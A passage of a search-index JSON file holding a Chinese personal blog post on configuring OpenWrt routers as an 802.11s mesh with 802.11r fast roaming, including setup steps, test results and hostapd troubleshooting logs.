\u8282\u70b9\u901a\u8fc7\u540c\u4e00\u4e2a\u4fe1\u9053\u7684\u7684\u65e0\u7ebf\u76f8\u4e92\u8fde\u63a5\uff0c\u800c\u901a\u8fc7\u53e6\u4e00\u4e2a\u65e0\u7ebf\u63d0\u4f9b WIFI\u3002</li> <li>\u5feb\u901f\u6f2b\u6e38(fast roaming) \u534f\u8bae\uff0c\u51c6\u786e\u6765\u8bf4\u53eb\u505a 802.11r \u534f\u8bae\uff0c\u53ef\u4ee5\u51cf\u5c11\u8bbe\u5907\u5207\u6362\u65e0\u7ebf\u7f51\u7edc\u7684\u8017\u65f6\u3002</li> </ul> <p>\u786c\u4ef6\u8bbe\u5907\u4e0a\uff0c\u6211\u9009\u62e9\u4f7f\u7528\u5c0f\u7c73\u8def\u7531 3G \u6765\u642d\u5efa\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u786c\u4ef6\u914d\u7f6e\u4e0a\u5728 wifi5 \u7684\u8def\u7531\u5668\u4e2d\u7b97\u662f\u5f88\u4e0d\u9519\u7684\u4e86\uff0c\u4e14\u67d0\u9c7c\u4e0a\u4e00\u4e2a\u53ea\u9700\u8981 50 \u5143\u3002\u4e8e\u662f\u53c8\u4e70\u4e86\u4e24\u4e2a\uff0c\u52a0\u4e0a\u539f\u672c\u7684\uff0c\u73b0\u5728\u6709 4 \u53f0 openwrt \u8def\u7531\u5668\uff0c\u4e00\u4e2a\u7ea2\u7c73 AC2100 \u4f5c\u4e3a\u4e3b\u8def\u7531\uff0c3 \u4e2a R3G \u4f5c\u4e3a AP \u8282\u70b9\u3002</p> <p>\u4e3a\u4e86\u65b9\u4fbf\u914d\u7f6e\u8fd8\u5b9e\u73b0\u4e86\u4e00\u4e2a\u81ea\u52a8\u914d\u7f6e\u811a\u672c\u653e\u5728 github\uff1aTheRainstorm/my-openwrt-config (github.com)</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u540d\u8bcd","title":"\u540d\u8bcd","text":"<ul> <li>Wireless Access Point   \u65e0\u7ebf\u63a5\u5165\u70b9\uff0c\u901a\u5e38\u7b80\u79f0\u4e3a AP\u3002AP \u5176\u5b9e\u9690\u542b dumb \u7684\u542b\u4e49\u3002\u8def\u7531\u5668\u8bbe\u7f6e\u91cc\u4e00\u822c\u4f1a\u6709\uff1a\u8def\u7531\u5668\u6a21\u5f0f\u3001AP \u6a21\u5f0f\u7b49\u9009\u9879\u3002AP \u6a21\u5f0f\u4e0b\uff0c\u8def\u7531\u5668\u4e0d\u63d0\u4f9b\u8def\u7531\u3001DHCP\u3001DNS \u7b49\u529f\u80fd\uff0c\u800c\u662f\u901a\u8fc7\u4e3b\u8def\u7531\u6765\u63d0\u4f9b\u3002<ul> <li>AP \u901a\u5e38\u7684\u4f5c\u7528\u662f\u4e3a\u73b0\u6709\u7684\u7f51\u7edc\u63d0\u4f9b\u989d\u5916\u7684\u65e0\u7ebf\u8986\u76d6\uff0c\u6bd4\u5982\u4e3b\u8def\u7531\u5668\u5728\u4e8c\u697c\uff0c\u901a\u8fc7 AP \u5c06\u7f51\u7edc\u8986\u76d6\u5230\u4e00\u697c\u3002</li> <li>\u5b9e\u73b0\u4e0a\uff0cAP \u5c06\u65e0\u7ebf\u63a5\u53e3\u548c LAN \u63a5\u53e3\u6865\u63a5\u5728\u4e00\u8d77\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u4e8c\u7ea7\u4ea4\u6362\u673a\u3002</li> </ul> </li> <li>SSID\u3001BSSID   SSID \u662f\u65e0\u7ebf\u7f51\u7edc\u7684\u540d\u79f0\uff0c\u4e0d\u540c\u7684 AP \u53ef\u4ee5\u63d0\u4f9b\u76f8\u540c\u7684 SSID\u3002BSSID \u662f\u65e0\u7ebf\u7f51\u7edc\u7684 MAC \u5730\u5740\uff0c\u662f\u552f\u4e00\u7684\u3002</li> </ul> <p>802.11k:\u65e0\u7ebf\u5c40\u57df\u7f51\u9891\u8c31\u8d44\u6e90\u6d4b\u91cf\u534f\u8bae\uff0c\u7531 AP \u626b\u63cf\u5468\u56f4\u90bb\u5c45 AP \u4fe1\u606f\uff0c\u914d\u5408\u7ec8\u7aef\u626b\u63cf\u6f5c\u5728\u6f2b\u6e38\u76ee\u6807\u4fe1\u606f\uff0c\u89e3\u51b3\u4f55\u65f6\u6f2b\u6e38\u95ee\u9898\u3002 802.11v:\u65e0\u7ebf\u7f51\u7edc\u7ba1\u7406\u534f\u8bae\uff0c\u7ec8\u7aef\u8bf7\u6c42\u6f2b\u6e38\u76ee\u6807\uff08\u975e\u5fc5\u8981\uff09\uff0cAP \u5efa\u8bae\u7ec8\u7aef\u6f2b\u6e38\u76ee\u6807\uff0c\u89e3\u51b3\u6f2b\u6e38\u5230\u4f55\u5904\u95ee\u9898\u3002 802.11r:\u5feb\u901f BSS \u8f6c\u6362\u534f\u8bae\uff0c\u6d88\u9664\u65e0\u7ebf\u91cd\u5173\u8054\u8fc7\u7a0b\u4e2d\u7684\u63e1\u624b\u5f00\u9500\uff0c\u6781\u5927\u51cf\u5c11\u6f2b\u6e38\u65f6\u95f4\uff0c\u89e3\u51b3\u5982\u4f55\u5173\u91cd\u5173\u8054\u95ee\u9898\u3002</p> <p>\u4e00\u3001\u8981\u6709\u81ea\u52a8\u5207\u6362 Wi-Fi \u4fe1\u53f7\u7684\u6548\u679c\uff0c\u53ea\u9700\u8981\u652f\u6301 80.11k \u548c 802.11v\uff0c\u7136\u540e\u6539\u76f8\u540c\u7684 Wi-Fi \u540d\u79f0\u548c\u5bc6\u7801\u5373\u53ef\uff0c\u53ea\u8981\u7ec8\u7aef\u4e5f\u652f\u6301 k \u548c v \u4e3b\u4f1a\u4e3b\u5207\u6362\uff0c\u800c 802.11r \u4e0d\u662f\u5fc5\u9700\u7684\u3002  </p> <p>\u4e8c\u3001MESH \u7ec4\u7f51\u4e0e\u81ea\u52a8\u5207\u6362\u662f\u4e24\u56de\u4e8b\uff0c\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\u3002MESH \u662f\u4e00\u79cd\u7ec4\u7f51\u65b9\u5f0f\uff0c\u800c\u7edd\u5927\u591a\u6570 MESH \u7ec4\u7f51\u540e\u5c31\u4f1a\u652f\u6301 k \u548c v\uff0c\u81f3\u5c11\u5728\u5f53\u4eca\u7684 Wi-Fi 6 \u65f6\u4ee3\u662f\u8fd9\u6837\u3002 \u4e09\u3001\u65e0\u7f1d\u6f2b\u6e38\uff0c\u662f\u6307\u81ea\u52a8\u5207\u6362\u7684\u65f6\u95f4\u505a\u5230\u5c3d\u91cf\u7684\u77ed\uff0c\u4ece\u800c\u8fbe\u5230\u5207\u6362\u8fc7\u7a0b\u4e0d\u4f1a\u51fa\u73b0\u65ad\u7ebf\u73b0\u8c61\uff0c\u600e\u4e48\u505a\u5230\u6700\u77ed\u5462\uff1f\u8fd9\u8ddf\u201c\u6f2b\u6e38\u9600\u503c\u201d\u3001\u201c\u5f3a\u4fe1\u53f7\u91cd\u53e0\u8303\u56f4\u201d\u6709\u5173\uff0c\u800c\u7edd\u5927\u591a\u6570\u65e0\u7ebf\u8def\u7531\u5668\u4e00\u822c\u6ca1\u6709\u6f2b\u6e38\u9600\u503c\u53ef\u8bbe\u7f6e\uff0c\u90a3\u6700\u7b80\u5355\u53ef\u63a7\u7684\u5c31\u662f\u5f3a\u4fe1\u53f7\u91cd\u53e0\u8303\u56f4\u4e86\uff0c\u901a\u8fc7\u6446\u653e\u4f4d\u7f6e\u6216\u964d\u4f4e\u4fe1\u53f7\u5f3a\u5ea6\u5373\u53ef\u3002\u5982\u6709\u5f31\u4fe1\u53f7\u5254\u9664\u529f\u80fd\u5c31\u66f4\u6709\u53ef\u63a7\u6027</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u65e0\u7ebf\u6f2b\u6e38\u7684\u8fc7\u7a0b","title":"\u65e0\u7ebf\u6f2b\u6e38\u7684\u8fc7\u7a0b","text":"<p>\u9700\u8981\u660e\u767d\u4e24\u4ef6\u4e8b</p> <ul> <li>\u7b2c\u4e00\uff0c\u8bbe\u5907\u503e\u5411\u4e8e\u8d56\u5728\u540c\u4e00\u4e2a\u7f51\u7edc\u4e0a\u3002\u5f53 WIFI \u7684\u4fe1\u53f7\u5f3a\u5ea6\u5f31\u4e8e -70dB\uff0c\u4e14\u65b0 WIFI \u7684\u4fe1\u53f7\u5f3a\u5ea6\u6bd4\u539f\u4fe1\u53f7\u9ad8 8-12dB \u65f6\u624d\u4f1a\u9009\u62e9\u5207\u6362\u7f51\u7edc\u3002</li> <li>\u7b2c\u4e8c\uff0c\u8fde\u63a5\u4e00\u4e2a\u7f51\u7edc\u9700\u8981\u7ecf\u8fc7\u4e00\u4e9b\u8017\u65f6\u8fc7\u7a0b\u3002<ol> <li>\u9700\u8981\u8fdb\u884c\u5bc6\u94a5\u4ea4\u6362\u3001\u534f\u5546\u52a0\u5bc6\u7b97\u6cd5</li> <li>\u8bbe\u5907\u9700\u8981\u83b7\u5f97\u4e00\u4e2a IP \u5730\u5740\uff08\u901a\u5e38\u901a\u8fc7 DHCP \u534f\u8bae\uff09</li> </ol> </li> </ul> <p>\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u7406\u8bba\u4e0a\u8def\u7531\u5668\u53ef\u4ee5\u7ed9\u8bbe\u5907\u53d1\u9001\u4fe1\u53f7\u4f7f\u5176\u9009\u62e9\u5207\u6362\u65e0\u7ebf\u7f51\u7edc\uff0c\u4e0d\u8fc7\u4e0d\u77e5\u9053\u76ee\u524d\u6709\u6ca1\u6709\u8fd9\u4e48\u505a\u3002 \u7b2c\u4e8c\u4e2a\u95ee\u9898</p> <ul> <li>\u5bf9\u4e8e\u5bc6\u94a5\u4ea4\u6362\u548c\u534f\u5546\u7684\u8fc7\u7a0b\u5f88\u660e\u663e\u662f\u53ef\u4ee5\u907f\u514d\u7684\uff0c802.11s \u534f\u8bae\u5e94\u8be5\u5c31\u662f\u8282\u7ea6\u4e86\u8fd9\u90e8\u5206\u7684\u65f6\u95f4\u3002\u53ea\u8981\u914d\u7f6e\u6210\u540c\u4e00\u4e2a\u57df\uff0c\u90a3\u4e48\u5728\u4e0d\u540c BSSID \u95f4\u5207\u6362\u5c31\u53ef\u4ee5\u5229\u7528\u539f\u6709\u7684\u8fde\u63a5\u3002</li> <li>\u800c\u5bf9\u4e8e\u83b7\u5f97 IP\uff0c\u53ea\u8981\u8def\u7531\u5668\u662f AP \u6a21\u5f0f\uff0c\u90a3\u4e48\u4fbf\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u539f\u672c\u7684 IP \u5730\u5740\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u4f7f\u7528\u539f\u672c\u7684 IP \u5730\u5740\u3002</li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#80211s-\u662f\u5426\u9700\u8981\u786c\u4ef6\u652f\u6301","title":"802.11s \u662f\u5426\u9700\u8981\u786c\u4ef6\u652f\u6301","text":"<p>\u7406\u8bba\u4e0a\u4e0d\u9700\u8981\uff0c\u4f46\u662f\u6709\u4e9b\u786c\u4ef6\u7684 wifi \u9a71\u52a8\u53ef\u80fd\u4f1a\u6709\u95ee\u9898\uff08\u5f00\u6e90\u9a71\u52a8\u57fa\u672c\u4e0d\u4f1a\u6709\u95ee\u9898\uff09 \u53ef\u4ee5\u901a\u8fc7 iw \u67e5\u770b\u9a71\u52a8\u662f\u5426\u6709 mesh \u9009\u9879\u3002</p> <pre><code>iw list | grep \"Supported interface modes\" -A 9\n</code></pre>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<p>\u53ef\u4ee5\u8be6\u7ec6\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1aOpenWrt 802.11s mesh | My wiki (bmaupin.github.io) \u81ea\u5df1\u5199\u4e86\u4e00\u4e2a\u81ea\u52a8\u914d\u7f6e\u811a\u672c\uff1aTheRainstorm/my-openwrt-config (github.com)</p> <p>\u4e3b\u8def\u7531\u53ea\u9700\u8981\u8bbe\u7f6e 802.11r \u5feb\u901f\u6f2b\u6e38\u5373\u53ef\uff0c\u800c AP \u5219\u9700\u8981\u8bbe\u7f6e mesh(802.11s)\uff0c\u5e76\u5728\u63d0\u4f9b wifi \u7684\u7f51\u7edc\u4e0a\u8bbe\u7f6e 802.11r</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u5b89\u88c5-wpad","title":"\u5b89\u88c5 wpad","text":"<p>openwrt wifi \u529f\u80fd\u7531 wpad \u5305\u63d0\u4f9b\u3002openwrt \u63d0\u4f9b\u4e86\u591a\u79cd wpad \u5305\uff0c\u9488\u5bf9\u4e0d\u540c\u529f\u80fd\u8fdb\u884c\u4e86\u526a\u88c1\uff0c\u5927\u5c0f\u4e0d\u540c\u3002\u4e0d\u540c\u5305\u4f1a\u51b2\u7a81\uff0c\u53ea\u80fd\u4f7f\u7528\u4e00\u4e2a\u3002\u4f7f\u7528 wpad-mesh-openssl \u5373\u53ef\u3002</p> <ul> <li>wpad\uff1a\u6700\u5b8c\u6574</li> <li>wpad-openssl</li> <li>wpad-mesh-openssl</li> <li>wpad-basic-openssl\uff1a\u7cbe\u7b80</li> </ul> <p>Install either\u00a0<code>wpad-mesh-openssl</code>\u00a0(for devices with a lot of storage/memory) or\u00a0<code>wpad-mesh-wolfssl</code>\u00a0(for devices with low storage/memory)</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#dummy-ap-\u914d\u7f6e","title":"dummy AP \u914d\u7f6e","text":"<p>\u5b98\u65b9\u6587\u6863\uff1a[OpenWrt Wiki] Wireless Access Point / Dumb Access Point</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u5173\u95ed-dhcp-\u670d\u52a1\u5668","title":"\u5173\u95ed DHCP \u670d\u52a1\u5668","text":"<p>ipv4 \u52fe\u9009 ignore interface \u5373\u53ef</p> <p></p> <p>ipv6 \u9700\u8981\u5c06 ra, dhcpv6, ndp \u5747\u8bbe\u7f6e\u4e3a disabled</p> <p></p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#lan-\u63a5\u53e3-ip-\u5730\u5740","title":"LAN \u63a5\u53e3 ip \u5730\u5740","text":"<p>LAN \u63a5\u53e3\u9700\u8981\u8bbe\u7f6e ip \u5730\u5740\uff0c\u6709\u4e24\u79cd\u65b9\u5f0f\uff08\u63a8\u8350\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff09</p> <ul> <li> <p>\u8bbe\u7f6e\u9759\u6001\u5730\u5740\uff0c\u9700\u8981\u540c\u65f6\u8bbe\u7f6e\u7f51\u5173\u3001DNS \u4e3a\u4e3b\u8def\u7531</p> <p></p> <p></p> </li> </ul> <ul> <li> <p>\u66f4\u7b80\u5355\u7684\u65b9\u5f0f\u4e3a\u5c06 LAN \u8bbe\u7f6e\u4e3a dhcp \u5ba2\u6237\u7aef\u3002\u8fd9\u6837\u597d\u5904\u662f\u4e0d\u7528\u914d\u7f6e\uff0c\u91cd\u542f\u540e\u8def\u7531\u5668\u52a0\u5165 mesh \u540e\u4fbf\u53ef\u4ee5\u6210\u529f\u4e0a\u7f51\u3002\u5728\u4e4b\u540e\u53ef\u4ee5\u5728\u4e3b\u8def\u7531 DHCP \u8bbe\u7f6e\u4e2d\u5206\u914d\u9759\u6001\u5730\u5740\uff0c\u8fd9\u6837\u8def\u7531\u5668\u4e0b\u6b21\u91cd\u542f\u4fbf\u4f1a\u83b7\u5f97\u6307\u5b9a ip \u5730\u5740\u4e86\u3002</p> <p></p> </li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u5173\u95ed\u9632\u706b\u5899dns-\u7b49\u670d\u52a1","title":"\u5173\u95ed\u9632\u706b\u5899\uff0cdns \u7b49\u670d\u52a1","text":"<p>system-&gt;starup \u4e2d\u5173\u95ed\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u670d\u52a1\uff0c\u5982 firewall, dnsmasq, odhcpd</p> <p></p> <p>\u4e3b\u8981\u90e8\u5206\u5df2\u7ecf\u914d\u7f6e\u5b8c\u6210\u3002\u63a5\u4e0b\u6765\u662f\u4e00\u4e9b\u53ef\u9009\u64cd\u4f5c</p> <ul> <li>\u5220\u9664\u6389 WAN, WAN6 \u7b49\u5176\u4f59\u63a5\u53e3</li> <li>\u5220\u9664\u6389\u6240\u6709\u9632\u706b\u5899 zone</li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#mesh-\u914d\u7f6e-80211s","title":"mesh \u914d\u7f6e (802.11s)","text":"<p>mesh \u9700\u8981\u5360\u6389\u4e00\u4e2a\u65e0\u7ebf\u9891\u6bb5\uff0c\u8fd9\u91cc\u6211\u9009\u62e9\u4f7f\u7528 2.4GHz\u3002\u56e0\u4e3a\u5bb6\u91cc\u7684\u5bbd\u5e26\u662f 100MHz\uff0c\u56e0\u6b64 2.4GHz \u7684 144Mbps \u5e26\u5bbd\u8db3\u591f\uff0c\u7136\u540e\u5c31\u662f 2.4GHz \u7684\u7a7f\u5899\u6027\u80fd\u8981\u597d\u5f97\u591a\u3002</p> <ul> <li> <p>\u9009\u62e9\u4e00\u4e2a radio \u65b0\u5efa\u4e00\u4e2a\u7f51\u7edc\uff0c\u6bd4\u5982 2.4GHz radio</p> <p></p> </li> </ul> <ul> <li> <p>\u8bbe\u7f6e WIFI \u4fe1\u9053\uff0c\u6240\u6709 mesh \u8282\u70b9\u9700\u8981\u4f7f\u7528\u76f8\u540c\u4fe1\u9053</p> <p></p> </li> </ul> <ul> <li> <p>\u7136\u540e\u7136\u540e\u9009\u62e9 mesh point \u6a21\u5f0f\u3002mesh id \u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4fdd\u8bc1 mesh \u8282\u70b9\u4e00\u81f4\u5373\u53ef\u3002\u52a0\u5bc6\u5fc5\u987b\u9009\u62e9 wpa3-SAE \u52a0\u5bc6\u3002</p> <p></p> </li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u65e0\u7ebf-80211r-\u914d\u7f6e","title":"\u65e0\u7ebf 802.11r \u914d\u7f6e","text":"<p>\u53e6\u4e00\u4e2a radio \u7528\u4e8e\u63d0\u4f9b\u4e0a\u7f51\uff0c\u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a\u63a5\u53e3\u9009\u62e9 AP \u6a21\u5f0f\uff08\u9ed8\u8ba4\u5df2\u7ecf\u5b58\u5728\uff09</p> <p></p> <p>\u4e3a\u4e86\u5b9e\u73b0\u5feb\u901f\u6f2b\u6e38\u9700\u8981\u8bbe\u7f6e 802.11r\uff0c\u4e3b\u8981\u9700\u8981\u8bbe\u7f6e Mobility Domain\uff0c\u4fdd\u8bc1\u6240\u6709\u8282\u70b9\u76f8\u540c</p> <p></p> <p>FT \u534f\u8bae\u7684\u533a\u522b\uff0c\u4e2a\u4eba\u611f\u89c9\u4e0d\u592a\u660e\u663e\u3002</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u6548\u679c","title":"\u6548\u679c","text":"<p>\u4e8c\u697c\u662f\u4e00\u53f0 RM2100 \u4f5c\u4e3a\u4e3b\u8def\u7531\uff0c\u63d0\u4f9b 2.4GHz \u548c 5GHz WIFI\u30025GHz \u4f7f\u7528 52 \u4fe1\u9053\u3002</p> <p>\u4e00\u697c\u6709 3 \u53f0 R3G\uff0c\u901a\u8fc7 mesh \u65e0\u7ebf\u76f8\u4e92\u8fde\u63a5\u3002\u5176\u4e2d\u4e00\u53f0\u901a\u8fc7\u7f51\u7ebf\u8fde\u63a5\u5230\u4e8c\u697c RM2100\u30023 \u53f0 R3G \u542f\u7528 5GHz WIFI \u540d\u5b57\u76f8\u540c\uff0c\u5206\u522b\u5360\u7528 36 \u4fe1\u9053\uff0c52 \u4fe1\u9053\uff0c100 \u4fe1\u9053\u3002\u4e0d\u540c\u4fe1\u9053\u95f4\u521a\u597d\u76f8\u5dee 80MHz \u7b49\u4e8e WIFI5 \u7684\u9891\u5bbd\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f8\u4e92\u4e0d\u5e72\u6270\u3002</p> <p>\u4e0b\u56fe\u5206\u522b\u662f\u4e8c\u697c\u4e3b\u8def\u7531\u548c\u4e00\u697c\u4e00\u53f0\u8def\u7531\u7684\u4fe1\u9053\u5206\u6790\u56fe</p> <p></p> <p></p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u7ed3\u679c","title":"\u7ed3\u679c","text":"<p>\u5728\u4e3b\u8def\u7531\u4e0a\u5f00\u542f iperf3 \u670d\u52a1\uff0c\u624b\u673a\u4e0a\u5b89\u88c5 iperf3 \u5ba2\u6237\u7aef\u6d4b\u901f\uff0c\u5e76\u5728\u4e00\u697c\u548c\u4e8c\u697c\u8d70\u52a8\u3002\u7ecf\u9a8c\u8bc1\u786e\u5b9e\u53ef\u4ee5\u81ea\u52a8\u5b9e\u73b0\u7f51\u7edc\u6f2b\u6e38\uff0c\u8d70\u5230\u67d0\u4e9b\u4f4d\u7f6e\u65f6\u7f51\u901f\u5728\u964d\u901f\u540e\u9a6c\u4e0a\u53ef\u4ee5\u6062\u590d\u3002</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u4f8b\u5b50","title":"\u4f8b\u5b50","text":"<p>rm2100:</p> <ul> <li>2.4G mesh + 2.4 Wifi (disabled)</li> <li>5G wifi r3g x 3</li> <li>2.4G mesh</li> <li>5G wifi</li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>\u8bbe\u7f6e AP \u548c\u5feb\u901f\u6f2b\u6e38\uff1aCHEAP WI-FI MESH ALTERNATIVE with fast roaming OpenWrt Wi-Fi Access points - YouTube</li> <li>batman\uff0c\u66f4\u590d\u6742\u4e5f\u529f\u80fd\u66f4\u591a\u7684 mesh \u534f\u8bae\uff1aDIY MESH WiFi with batman-adv and OpenWrt - YouTube</li> <li>802.11k, v, r \u7684\u4ecb\u7ecd\uff1aFast Roaming with 802.11k, 802.11v, and 802.11r - Windows drivers | Microsoft Docs</li> <li>FT over DS \u8fd8\u662f FT over AirWhen does 802.11r \"FT over DS\" make sense to use? - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum<ul> <li>802.11r Fast Roaming configuration (channels and FT) - Installing and Using OpenWrt - OpenWrt Forum<ul> <li>Over-the-Air\u2014The client communicates directly with the target AP using IEEE 802.11 authentication with the FT authentication algorithm.</li> <li>Over-the-DS\u2014The client communicates with the target AP through the current AP.</li> </ul> </li> </ul> </li> </ul> <pre><code>daemon.debug hostapd: wlan0: STA e0:...:30 WPA: FT authentication already completed - do not start 4-way handshake\n</code></pre>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#mesh-\u8bbe\u5907\u672a\u6fc0\u6d3b","title":"mesh \u8bbe\u5907\u672a\u6fc0\u6d3b","text":"<p>rm2100 \u5f00\u542f mesh\uff0cradio0 \u8bbe\u5907\u663e\u793a\u8bbe\u5907\u672a\u6fc0\u6d3b</p> <pre><code>Sat Feb  3 21:55:53 2024 daemon.notice hostapd: phy0-ap0: AP-DISABLED\nSat Feb  3 21:55:53 2024 daemon.err hostapd: hostapd_free_hapd_data: Interface phy0-ap0 wasn't started\nSat Feb  3 21:55:53 2024 daemon.notice hostapd: nl80211: deinit ifname=phy0-ap0 disabled_11b_rates=0\nSat Feb  3 21:55:53 2024 kern.info kernel: [  970.826050] device phy0-ap0 left promiscuous mode\nSat Feb  3 21:55:53 2024 kern.info kernel: [  970.831019] br-lan: port 5(phy0-ap0) entered disabled state\nSat Feb  3 21:55:54 2024 daemon.notice hostapd: phy0-ap0: interface state ACS-&gt;DISABLED\nSat Feb  3 21:55:54 2024 daemon.notice netifd: lan (2365): udhcpc: sending renew to server 192.168.33.1\nSat Feb  3 21:55:54 2024 daemon.notice netifd: lan (2365): udhcpc: lease of 192.168.33.212 obtained from 192.168.33.1, lease time 43200\nSat Feb  3 21:55:55 2024 daemon.notice wpa_supplicant[1248]: phy0-mesh0: interface state UNINITIALIZED-&gt;ENABLED\nSat Feb  3 21:55:55 2024 daemon.notice wpa_supplicant[1248]: phy0-mesh0: AP-ENABLED\nSat Feb  3 21:55:55 2024 daemon.notice wpa_supplicant[1248]: phy0-mesh0: joining mesh my_mesh\nSat Feb  3 21:55:55 2024 daemon.err wpa_supplicant[1248]: phy0-mesh0: mesh join error=-1\n</code></pre> <p>\u624b\u52a8\u8bbe\u7f6e\u4f7f\u7528 channel 1, \u8bbe\u7f6e 40MHz \u9891\u5bbd\u540e\u7a81\u7136\u53ef\u4ee5\u4e86</p> <pre><code>Sat Feb  3 22:05:21 2024 daemon.notice wpa_supplicant[1248]: Set new config for phy phy0\nSat Feb  3 22:05:21 2024 daemon.notice hostapd: Set new config for phy phy0: /var/run/hostapd-phy0.conf\nSat Feb  3 22:05:21 2024 daemon.notice hostapd: Restart interface for phy phy0\nSat Feb  3 22:05:21 2024 daemon.notice hostapd: Remove interface 'phy0'\nSat Feb  3 22:05:21 2024 daemon.notice hostapd: phy0-ap0: interface state DISABLED-&gt;DISABLED\nSat Feb  3 22:05:21 2024 daemon.notice hostapd: phy0-ap0: AP-DISABLED\nSat Feb  3 22:05:21 2024 daemon.notice hostapd: phy0-ap0: CTRL-EVENT-TERMINATING\nSat Feb  3 22:05:21 2024 daemon.err hostapd: rmdir[ctrl_interface=/var/run/hostapd]: Permission denied\nSat Feb  3 22:05:21 2024 daemon.err hostapd: hostapd_free_hapd_data: Interface phy0-ap0 wasn't started\nSat Feb  3 22:05:21 2024 daemon.notice hostapd: nl80211: deinit ifname=phy0-ap0 disabled_11b_rates=0\nSat Feb  3 22:05:21 